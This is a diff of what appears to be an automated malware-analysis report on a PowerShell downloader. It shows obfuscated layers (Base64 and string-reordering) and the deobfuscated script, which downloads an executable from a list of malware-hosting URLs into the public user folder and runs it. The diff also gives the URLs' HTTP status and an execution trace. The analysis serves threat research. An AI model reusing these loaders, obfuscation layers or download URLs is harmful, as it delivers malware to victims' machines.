@@ -1,7 +1,7 @@
-Layer 1 - Obfuscation type: Base64
+Layer 1 - Obfuscation type: String-Based
 
 
-PowerShell -e IABpAGUAWAAgACgAKAAoACIAewA0ADQAfQB7ADEAMAA0AH0AewA5ADgAfQB7ADEAfQB7ADYAOQB9AHsAOAAyAH0AewAxADYAfQB7ADIAOQB9AHsAMQAwADMAfQB7ADEAOQB9AHsAMgA0AH0AewAxADgAfQB7ADYAMgB9AHsANgA2AH0AewA1ADQAfQB7ADgANQB9AHsAMQAxADQAfQB7ADYANQB9AHsAMwAwAH0AewA3ADkAfQB7ADgANgB9AHsANQA4AH0AewAyADUAfQB7ADcAMAB9AHsAMQAwADYAfQB7ADcAfQB7ADQAfQB7ADQANQB9AHsANgAwAH0AewAzADkAfQB7ADEAMAAwAH0AewAzADMAfQB7ADMANQB9AHsANwA0AH0AewAxADQAfQB7ADkAMwB9AHsAMwA2AH0AewA0ADEAfQB7ADgAOAB9AHsANwAzAH0AewAxADEANQB9AHsANQAyAH0AewA4ADkAfQB7ADYANAB9AHsAMQAxADMAfQB7ADUAfQB7ADkANgB9AHsAOAA0AH0AewAyADgAfQB7ADQAMgB9AHsANwAxAH0AewAxADAAfQB7ADUANwB9AHsANgAxAH0AewAxADAAOQB9AHsANAAwAH0AewAxADAANwB9AHsANwA3AH0AewAyADEAfQB7ADQAOQB9AHsANwAyAH0AewAzADQAfQB7ADUAMQB9AHsAOAB9AHsANwA4AH0AewAyADMAfQB7ADYANwB9AHsANQA1AH0AewA4ADAAfQB7ADEAMQB9AHsAMQAwADIAfQB7ADEAMQAyAH0AewAxADAAOAB9AHsAMQAwADEAfQB7ADIANgB9AHsAOQA3AH0AewAxADIAfQB7ADcANgB9AHsAMgB9AHsAOQAyAH0AewA5AH0AewAwAH0AewAyADcAfQB7ADQAOAB9AHsANQAzAH0AewA2AH0AewAxADUAfQB7ADgAMQB9AHsAMwB9AHsANAA2AH0AewA1ADAAfQB7ADUANgB9AHsAMwAyAH0AewA5ADUAfQB7ADkAOQB9AHsANwA1AH0AewAxADcAfQB7ADgANwB9AHsANAAzAH0AewA2ADgAfQB7ADgAMwB9AHsAMQAxADEAfQB7ADEAMAA1AH0AewA0ADcAfQB7ADIAMAB9AHsANgAzAH0AewAzADcAfQB7ADEAMQAwAH0AewA5ADAAfQB7ADIAMgB9AHsANQA5AH0AewA5ADEAfQB7ADEAMwB9AHsAMwA4AH0AewA5ADQAfQB7ADMAMQB9ACIALQBmACcAZQBlAEwAWgAnACwAJwBaAGUAJwAsACcAIAAnACwAJwBFAEQAJwAsACcAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAJwAsACcAWgAzACcALAAnAHQAcgB5AHsAJwAsACcAUwB5AHMAJwAsACcALgBjAG8AbQAvAHcAJwAsACcAWgAnACwAJwBLAEsALwBAAGgAdAB0AHAAOgAvAC8AaABhAG4AbgBpAGcAYQBuACcALAAnAEwAWgBlACkAOwB0ACcALAAnAGMAIAArACAATABaAGUASwBRADQATABaAGUAJwAsACcAYQBTAEQAQwApADsAYgByACcALAAnAGEAZABhAHMAZAAnACwAJwB0ADcAYQBZACcALAAnAEwAJwAsACcAYQBzAGYAYwAuAG0ANQBFAFQAbwBTAHQAcgBpAHQASwBpAGkAdAAnACwAJwBaAGUAdwAtACcALAAnAFoAZQAnACwAJwBuACcALAAnAG0AJwAsACcAWgBlAGsATAAnACwAJwByAEUAYgBjAC8AJwAsACcAKwBMACcALAAnAFoAZQArAEwAWgBlACcALAAnADcAJwAsACcAZQApADsAJwAsACcAZAB2AC0AcwB5AHMAJwAsACcAWgBlAGUAJwAsACcAZABvAG0AOwB0ADcAYQBZACcALAAnAH0AJwAsACcAbAAnACwAJwAgAD0AIAAnACwAJwBUAC8AQABoAHQAdABwADoALwAvAGcAZQBuAGUAJwAsACcAdAA3AGEAJwAsACcAMQAnACwAJwBaACcALAAnAGUAYQBrACcALAAnAHQAOwB0ADcAJwAsACcAQABoAHQAdABwACcALAAnADAAMAAwADAALAAnACwAJwB0AGUAJwAsACcALAAgACcALAAnAHQANwBhAG4AcwBhAGQAYQBzAGQAIAAnACwAJwBsAGkAZQAnACwAJwBvAGkAdABLAFcAJwAsACcATABaAGUASQAnACwAJwBmAG8AcgBlAGEAYwBoACgAJwAsACcALQBrAG8AZQBuAGkAZwAuAGQAZQAvAEMAJwAsACcAbgBsAGkAdABLAE8AJwAsACcAcgBhAGwAYgBpAGsAZQBzACcALAAnAD0AIABMAFoAZQANAAoAJwAsACcAdAA3AGEAYQBzAGYAYwAgAGkAbgAgAHQANwBhAEEARABDAFgAKQB7ACcALAAnACsATABaACcALAAnAFoAZQAuAFMAcABsAGkAdAAnACwAJwBhAGQARgBJAGkAdABLACcALAAnAHMALgB1ACcALAAnAGUAbgBlAEwAJwAsACcAWgBlACsATABaACcALAAnAG4AJwAsACcAcwAvAGsAMgBpAHIAOQAnACwAJwBvAGIAJwAsACcAdgBvAEwAJwAsACcAcAA6AC8ALwBpAHMAYQAnACwAJwBlACkAIAByAGEAbgAnACwAJwBqAGUAYwBMAFoAZQAnACwAJwBMACcALAAnAHQANwBhACcALAAnAG4ATAAnACwAJwB3ACcALAAnAG0AZQAuAGQAZQAvAHgATwA4AHgAJwAsACcAbwBPACcALAAnADsAJwAsACcAbgBzACcALAAnACgAdAA3AGEAJwAsACcAIAArACAAdAA3AGEATgBTAEIAIAArACcALAAnAGEAJwAsACcANQAnACwAJwBZAFUAIAA9ACAALgAoAEwAJwAsACcAKABMAFoAZQBAACcALAAnAFkAVQAuAG0ANQAnACwAJwBaAGUAKwAnACwAJwBTAEQAQwApACcALAAnAHQAcAA6AC8ALwBwAGwAbwBzAHMALQBlACcALAAnAGUAdAAnACwAJwBaACcALAAnAEsATgBnAG0ANQBFACgAKQAnACwAJwAgADIAOAAyADEAMwAzACkAJwAsACcAaAB0AHQAJwAsACcAKwBMACcALAAnAGUAZQAtAEkAdABlAG0ATABaAGUAKQAoAHQANwAnACwAJwAoAEwAWgBlAC4AZQB4AEwAWgBlACsATAAnACwAJwAuAG4AZQB4AHQAKAAnACwAJwA7AH0AYwBhAHQAYwBoAHsAfQAnACwAJwBlACcALAAnAGQALwBAAGgAdAAnACwAJwBhAGUAbgB2ADoAcAB1AGIAbABpACcALAAnACYAKABMACcALAAnAG0ANQBFACcALAAnAGEATgBTAEIAJwAsACcAPQAgAHQAJwAsACcANwAnACwAJwBMACcALAAnAD0AIAAnACwAJwAoACcALAAnAEwAWgBlACsATABaAGUALQBvAGIAagBlAGMAdABMAFoAZQApACAAJwAsACcAOgAvAC8AZgAnACwAJwBTAEQAQwAgACcALAAnAC8AJwAsACcAZQAnACwAJwA7ACYAJwAsACcAYQAnACwAJwBtAGEAaQBuAGUALgBjAG8AbQAvAHMAJwAsACcATABaACcALAAnAHQANwBhAEEARABDAFgAIAAnACkAKQAuAHIARQBQAEwAYQBDAEUAKAAoAFsAYwBIAEEAcgBdADEAMAA1ACsAWwBjAEgAQQByAF0AMQAxADYAKwBbAGMASABBAHIAXQA3ADUAKQAsAFsAcwBUAFIASQBuAEcAXQBbAGMASABBAHIAXQA5ADYAKQAuAHIARQBQAEwAYQBDAEUAKAAnAHQANwBhACcALABbAHMAVABSAEkAbgBHAF0AWwBjAEgAQQByAF0AMwA2ACkALgByAEUAUABMAGEAQwBFACgAJwBMAFoAZQAnACwAWwBzAFQAUgBJAG4ARwBdAFsAYwBIAEEAcgBdADMAOQApAC4AcgBFAFAATABhAEMARQAoACgAWwBjAEgAQQByAF0AMQAwADkAKwBbAGMASABBAHIAXQA1ADMAKwBbAGMASABBAHIAXQA2ADkAKQAsAFsAcwBUAFIASQBuAEcAXQBbAGMASABBAHIAXQAzADQAKQAuAHIARQBQAEwAYQBDAEUAKAAoAFsAYwBIAEEAcgBdADcANQArAFsAYwBIAEEAcgBdADgAMQArAFsAYwBIAEEAcgBdADUAMgApACwAWwBzAFQAUgBJAG4ARwBdAFsAYwBIAEEAcgBdADkAMgApACAAKQAgAA==
+&( $SHellID[1]+$shEllId[13]+'x')( (('sV z5R ( fNV ) )63'+']RAHC[,eQxjPkeQx EcaLPErc- 6'+'9]RAHC[,)88]RAHC[+001]RAHC[+15]RAHC[(ecalPer-29]'+'RAHC[,)'+'911]RAHC[+58]RAHC[+35]RAHC[( EcaLPErc-93]RAHC[,eQx'+'JQreQx'+'EcaLPErc-43]RAHC[,eQxw8ieQx ecalP'+'er-)eQx}}{eQx+eQxhceQx+eQxteQx+eQxac};eQx+eQxkaereQx+e'+'Qxb;eQx+eQx)eQx+eQxCDSjP'+'k()JQeQx+eQxr'+'meeQx+eQxtIeQx+eQx-eJQeQ'+'x+eQxr+eQx+eQxJQrkeQx+eQxJQr+eQx+eQxJ'+'QroveQx+eQxnIJQreQx+eQx(&;)'+'CDeQx+eQxSjPk ,eQx+eQx)(w8ieQx+eQxgNXdeQx+eQx3iXd3rtSeQx+eQxoeQx+eQxTeQx+eQxw8eQx+eQxieQx+eQx.ceQx+eQxfseQx+eQxajPk(w8eQx+eQxielX'+'deQx+eQx3IFeQx+eQxdaOe'+'Qx+eQxXeQx+eQxd3eQx+eQxlnWeQx+eQxXd3eQx+eQxoDweQx+eQx8eQx+eQxi.UYeQx+eQxYjeQx+eQxPk{yrt{)XeQx+eQxCDAjeQx+eQxPkeQx+eQx ni eQx+eQxcfsajPkeQx+eQx(hcaeeQx+eQxreQx'+'+eQxof;)JQeQx+eQxreQx+eQxeJQr+JeQx+eQxQrxe.eQx+eQxJQreQx+eQx( + BSNeQx+eQxjPk + '+'J'+'eQx+eQxQeQx+eQxrwU5JQr + ceQx+eQxilbueQx+eQxp:vneQx+eQxejPk =eQx+eQx CDSeQx+eQxjeQx+eQxPk'+'eQx+eQx;)eQx+eQxJQreQx+eQx?JQreQx+eQx(tilpeQx+eQxS.JQeQx+e'+'Qxre'+'Qx+eQx/peQx+eQxjeQx+eQxfuY7C/moeQx+eQxc.elytseeQx+eQxfileQx+eQxarceQx+eQxceQx+eQxa'+'eQx+eQx//:peQx+eQxtteQx+e'+'Qxh?/kJ3wEe/moceQx+eQx.pohseQx+e'+'QxirteQx+eQxap//:peQx+eQxttheQx+eQx?eQx+eQx/POeQx+eQxdCm/eQx+eQxmoceQx+eQx.sseQx+eQxecorp-eQx+eQxdraobeQx+eQxno//:p'+'tteQx+eQxh?/UAeQx+eQxJ'+'yeQx+eQx/eQx+eQxaz.oc.kcaeQx+e'+'QxhseheQx+eQxtmoeQx+eQxreQx+eQxfzyob//:eQx+eQxpeQx+eQxteQ'+'x+eQxth?eQx+eQx'+'/eQx+eQxAQIjeQx+eQxG/eQx+'+'eQxmoceQx+eQx.noeQx+eQxitarotsereQx+eQxriahsu.wweQx+eQxweQx+eQx/eQx+eQx/eQx+eQx:eQx+eQxpeQx+eQxtteQx+eQxh JQr eQx+eQx= XCDAjPeQx+eQxk;)eQx+eQx331eQx+eQx28eQx+eQx2 ,0eQx+eQx0001eQ'+'x+e'+'Qx(txeQx+'+'eQxen.dseQx+eQxaeQx+eQxdasnjPk =eQx+e'+'Qx BSNeQx+eQxjeQx+eQxPkeQx+eQx;tneQx+eQxeeQx+eQxileQx+eQxCbeW.teN.meeQx+eQxtsyS )eQ'+'x+eQxJeQx+eQxQeQx+eQxrtcejbo-JQeQx+eQxr+JQrwJQr+JQeQx+eQxrenJeQx+eQxQreQx+eQx(. = eQx+eQxUeQx+eQxYYjPk'+';modnar'+' )JQr'+'eQx+eQxtJeQx+eQxQr+eQx+eQxJeQx+e'+'QxQrcejbo-eQx+eQxwJeQx+eQxQeQx+eQx'+'r+JeQx+eQxQreQx+eQxeJQr+JQrneQx+eQxJQr(& eQx+eQx= eQx+eQxdsaeQx+eQxdaeQx+eQxsnjeQx+eQxPkeQx((( )eQxeQxNiOj-]2,11,3[EMaN.)eQx*rDM*eQx VG(( & fNV ) ; [StRing]::jOiN( eQxeQx ,( V'+'AriAblE Z5R ).vALUe[-1.. - (( VAriAblE Z5R ).vALUe.lenGTH )] '+')Zis .( 4tCpshoME[4]+4tCpshOmE[30]+eQxxeQx)') -rEplAce 'eQx',[cHaR]39-rEplAce 'fNV',[cHaR]34 -CrEPlacE ([cHaR]52+[cHaR]116+[cHaR]67),[cHaR]36-rEplAce'Zis',[cHaR]124)) 
 
 
 
@@ -10,8 +10,8 @@ PowerShell -e IABpAGUAWAAgACgAKAAoACIAewA0ADQAfQB7ADEAMAA0AH0AewA5ADgAfQB7ADEAfQ
 Layer 2 - Obfuscation type: String-Based
 
 
- ieX ((("{44}{104}{98}{1}{69}{82}{16}{29}{103}{19}{24}{18}{62}{66}{54}{85}{114}{65}{30}{79}{86}{58}{25}{70}{106}{7}{4}{45}{60}{39}{100}{33}{35}{74}{14}{93}{36}{41}{88}{73}{115}{52}{89}{64}{113}{5}{96}{84}{28}{42}{71}{10}{57}{61}{109}{40}{107}{77}{21}{49}{72}{34}{51}{8}{78}{23}{67}{55}{80}{11}{102}{112}{108}{101}{26}{97}{12}{76}{2}{92}{9}{0}{27}{48}{53}{6}{15}{81}{3}{46}{50}{56}{32}{95}{99}{75}{17}{87}{43}{68}{83}{111}{105}{47}{20}{63}{37}{110}{90}{22}{59}{91}{13}{38}{94}{31}"-f'eeLZ','Ze',' ','ED','tem.Net.WebC','Z3','try{','Sys','.com/w','Z','KK/@http://hannigan','LZe);t','c + LZeKQ4LZe','aSDC);br','adasd','t7aY','L','asfc.m5EToStritKiit','Zew-','Ze','n','m','ZekL','rEbc/','+L','Ze+LZe','7','e);','dv-sys','Zee','dom;t7aY','}','l',' = ','T/@http://gene','t7a','1','Z','eak','t;t7','@http','0000,','te',', ','t7ansadasd ','lie','oitKW','LZeI','foreach(','-koenig.de/C','nlitKO','ralbikes','= LZe
-','t7aasfc in t7aADCX){','+LZ','Ze.Split','adFIitK','s.u','eneL','Ze+LZ','n','s/k2ir9','ob','voL','p://isa','e) ran','jecLZe','L','t7a','nL','w','me.de/xO8x','oO',';','ns','(t7a',' + t7aNSB +','a','5','YU = .(L','(LZe@','YU.m5','Ze+','SDC)','tp://ploss-e','et','Z','KNgm5E()',' 282133)','htt','+L','ee-ItemLZe)(t7','(LZe.exLZe+L','.next(',';}catch{}','e','d/@ht','aenv:publi','&(L','m5E','aNSB','= t','7','L','= ','(','LZe+LZe-objectLZe) ','://f','SDC ','/','e',';&','a','maine.com/s','LZ','t7aADCX ')).rEPLaCE(([cHAr]105+[cHAr]116+[cHAr]75),[sTRInG][cHAr]96).rEPLaCE('t7a',[sTRInG][cHAr]36).rEPLaCE('LZe',[sTRInG][cHAr]39).rEPLaCE(([cHAr]109+[cHAr]53+[cHAr]69),[sTRInG][cHAr]34).rEPLaCE(([cHAr]75+[cHAr]81+[cHAr]52),[sTRInG][cHAr]92) ) 
+sV z5R ( " ) )63]RAHC[,'jPk' EcaLPErc- 69]RAHC[,)88]RAHC[+001]RAHC[+15]RAHC[(ecalPer-29]RAHC[,)911]RAHC[+58]RAHC[+35]RAHC[( EcaLPErc-93]RAHC[,'JQr'EcaLPErc-43]RAHC[,'w8i' ecalPer-)'}}{'+'hc'+'t'+'ac};'+'kaer'+'b;'+')'+'CDSjPk()JQ'+'rme'+'tI'+'-eJQ'+'r+'+'JQrk'+'JQr+'+'JQrov'+'nIJQr'+'(&;)CD'+'SjPk ,'+')(w8i'+'gNXd'+'3iXd3rtS'+'o'+'T'+'w8'+'i'+'.c'+'fs'+'ajPk(w8'+'ielXd'+'3IF'+'daO'+'X'+'d3'+'lnW'+'Xd3'+'oDw'+'8'+'i.UY'+'Yj'+'Pk{yrt{)X'+'CDAj'+'Pk'+' ni '+'cfsajPk'+'(hcae'+'r'+'of;)JQ'+'r'+'eJQr+J'+'Qrxe.'+'JQr'+'( + BSN'+'jPk + J'+'Q'+'rwU5JQr + c'+'ilbu'+'p:vn'+'ejPk ='+' CDS'+'j'+'Pk'+';)'+'JQr'+'?JQr'+'(tilp'+'S.JQ'+'r'+'/p'+'j'+'fuY7C/mo'+'c.elytse'+'fil'+'arc'+'c'+'a'+'//:p'+'tt'+'h?/kJ3wEe/moc'+'.pohs'+'irt'+'ap//:p'+'tth'+'?'+'/PO'+'dCm/'+'moc'+'.ss'+'ecorp-'+'draob'+'no//:ptt'+'h?/UA'+'Jy'+'/'+'az.oc.kca'+'hseh'+'tmo'+'r'+'fzyob//:'+'p'+'t'+'th?'+'/'+'AQIj'+'G/'+'moc'+'.no'+'itarotser'+'riahsu.ww'+'w'+'/'+'/'+':'+'p'+'tt'+'h JQr '+'= XCDAjP'+'k;)'+'331'+'28'+'2 ,0'+'0001'+'(tx'+'en.ds'+'a'+'dasnjPk ='+' BSN'+'j'+'Pk'+';tn'+'e'+'il'+'CbeW.teN.me'+'tsyS )'+'J'+'Q'+'rtcejbo-JQ'+'r+JQrwJQr+JQ'+'renJ'+'Qr'+'(. = '+'U'+'YYjPk;modnar )JQr'+'tJ'+'Qr+'+'J'+'Qrcejbo-'+'wJ'+'Q'+'r+J'+'Qr'+'eJQr+JQrn'+'JQr(& '+'= '+'dsa'+'da'+'snj'+'Pk'((( )''NiOj-]2,11,3[EMaN.)'*rDM*' VG(( & " ) ; [StRing]::jOiN( '' ,( VAriAblE Z5R ).vALUe[-1.. - (( VAriAblE Z5R ).vALUe.lenGTH )] )| .( $pshoME[4]+$pshOmE[30]+'x')
+
 
 
 
@@ -20,43 +20,52 @@ Layer 2 - Obfuscation type: String-Based
 Layer 3 - Obfuscation type: String-Based
 
 
-$nsadasd = &('n'+'e'+'w-objec'+'t') random;$YYU = .('ne'+'w'+'-object') System.Net.WebClient;$NSB = $nsadasd.next(10000, 282133);$ADCX = '
-http://isamaine.com/sZ3d/@http://ploss-edv-systeme.de/xO8xKK/@http://hannigans.us/k2ir9/@http://fam-koenig.de/CoOT/@http://generalbikes.com/w5rEbc/'.Split('@');$SDC = $env:public + '\' + $NSB + ('.ex'+'e');foreach($asfc in $ADCX){try{$YYU."Do`Wnl`OadFI`le"($asfc."ToStr`i`Ng"(), $SDC);&('Invo'+'k'+'e-Item')($SDC);break;}catch{}}
+ & ((GV '*MDr*').NaME[3,11,2]-jOiN'') ((('kP'+'jns'+'ad'+'asd'+' ='+' &(rQJ'+'nrQJ+rQJe'+'rQ'+'J+r'+'Q'+'Jw'+'-objecrQ'+'J'+'+rQ'+'Jt'+'rQJ) random;kPjYY'+'U'+' = .('+'rQ'+'Jner'+'QJ+rQJwrQJ+r'+'QJ-objectr'+'Q'+'J'+') Syst'+'em.Net.WebC'+'li'+'e'+'nt;'+'kP'+'j'+'NSB '+'= kPjnsad'+'a'+'sd.ne'+'xt('+'1000'+'0, 2'+'82'+'133'+');k'+'PjADCX ='+' rQJ h'+'tt'+'p'+':'+'/'+'/'+'w'+'ww.ushair'+'restorati'+'on.'+'com'+'/G'+'jIQA'+'/'+'?ht'+'t'+'p'+'://boyzf'+'r'+'omt'+'hesh'+'ack.co.za'+'/'+'yJ'+'AU/?h'+'ttp://on'+'board'+'-proce'+'ss.'+'com'+'/mCd'+'OP/'+'?'+'htt'+'p://pa'+'tri'+'shop.'+'com/eEw3Jk/?h'+'tt'+'p://'+'a'+'c'+'cra'+'lif'+'estyle.c'+'om/C7Yuf'+'j'+'p/'+'r'+'QJ.S'+'plit('+'rQJ?'+'rQJ'+');'+'kP'+'j'+'SDC '+'= kPje'+'nv:p'+'ubli'+'c + rQJ5Uwr'+'Q'+'J + kPj'+'NSB + ('+'rQJ'+'.exrQ'+'J+rQJe'+'r'+'QJ);fo'+'r'+'each('+'kPjasfc'+' in '+'kP'+'jADC'+'X){try{kP'+'jY'+'YU.i'+'8'+'wDo'+'3dX'+'Wnl'+'3d'+'X'+'Oad'+'FI3'+'dXlei'+'8w(kPja'+'sf'+'c.'+'i'+'8w'+'T'+'o'+'Str3dXi3'+'dXNg'+'i8w()'+', kPjS'+'DC);&('+'rQJIn'+'vorQJ'+'+rQJ'+'krQJ'+'+r'+'QJe-'+'It'+'emr'+'QJ)(kPjSDC'+')'+';b'+'reak'+';}ca'+'t'+'ch'+'{}}')-rePlace 'i8w',[CHAR]34-crEPLacE'rQJ',[CHAR]39-crEPLacE ([CHAR]53+[CHAR]85+[CHAR]119),[CHAR]92-rePlace([CHAR]51+[CHAR]100+[CHAR]88),[CHAR]96 -crEPLacE 'kPj',[CHAR]36) ) 
 
 
 
 
 
 
-Layer 4 - Plainscript
+Layer 4 - Obfuscation type: String-Based
 
 
-$nsadasd = new-object random;$YYU = new-object System.Net.WebClient;$NSB = $nsadasd.next(10000, 282133);$ADCX = '
-http://isamaine.com/sZ3d/@http://ploss-edv-systeme.de/xO8xKK/@http://hannigans.us/k2ir9/@http://fam-koenig.de/CoOT/@http://generalbikes.com/w5rEbc/'.Split('@');$SDC = $env:public + '\' + $NSB + '.exe';foreach($asfc in $ADCX){try{$YYU.DoWnlOadFIle($asfc.ToStriNg(), $SDC);Invoke-Item($SDC);break;}catch{}}
-
-
+$nsadasd = &('n'+'e'+'w-objec'+'t') random;$YYU = .('ne'+'w'+'-object') System.Net.WebClient;$NSB = $nsadasd.next(10000, 282133);$ADCX = ' http://www.ushairrestoration.com/GjIQA/?http://boyzfromtheshack.co.za/yJAU/?http://onboard-process.com/mCdOP/?http://patrishop.com/eEw3Jk/?http://accralifestyle.com/C7Yufjp/'.Split('?');$SDC = $env:public + '\' + $NSB + ('.ex'+'e');foreach($asfc in $ADCX){try{$YYU."Do`Wnl`OadFI`le"($asfc."ToStr`i`Ng"(), $SDC);&('Invo'+'k'+'e-Item')($SDC);break;}catch{}}
 
 
 
-Active Malware Hosting URLs:
-
-http://ploss-edv-systeme.de/xO8xKK/
 
 
 
-Down Malware Hosting URLs:
+Layer 5 - Plainscript
 
-http://isamaine.com/sZ3d/
 
-http://hannigans.us/k2ir9/
+$nsadasd = new-object random;$yyu = new-object system.net.webclient;$nsb = $nsadasd.next(10000, 282133);$adcx = ' http://www.ushairrestoration.com/gjiqa/?http://boyzfromtheshack.co.za/yjau/?http://onboard-process.com/mcdop/?http://patrishop.com/eew3jk/?http://accralifestyle.com/c7yufjp/'.split('?');$sdc = $env:public + '\' + $nsb + '.exe';foreach($asfc in $adcx){try{$yyu.downloadfile($asfc.tostring(), $sdc);invoke-item($sdc);break;}catch{}}
 
-http://fam-koenig.de/CoOT/
 
-http://generalbikes.com/w5rEbc/
+
+
+
+Malware Hosting URLs Report:
+
+[404: Not Found] -  http://www.ushairrestoration.com/gjiqa/
+
+[404: Not Found] -  http://boyzfromtheshack.co.za/yjau/
+
+[404: Not Found] -  http://onboard-process.com/mcdop/
+
+[500: Internal Server Error] -  http://patrishop.com/eew3jk/
+
+[500: Internal Server Error] -  http://accralifestyle.com/c7yufjp/
 
 
 
 Execution Report:
 
-Script attempted to invoke C:\Users\Public\158327.exe
+Script attempted to generate a random integer between 10000 and 282133. Value returned: 63949
+
+Script attempted to download from  http://www.ushairrestoration.com/GjIQA/ and save to: C:\Users\Public\63949.exe
+
+Script attempted to invoke C:\Users\Public\63949.exe
+
 
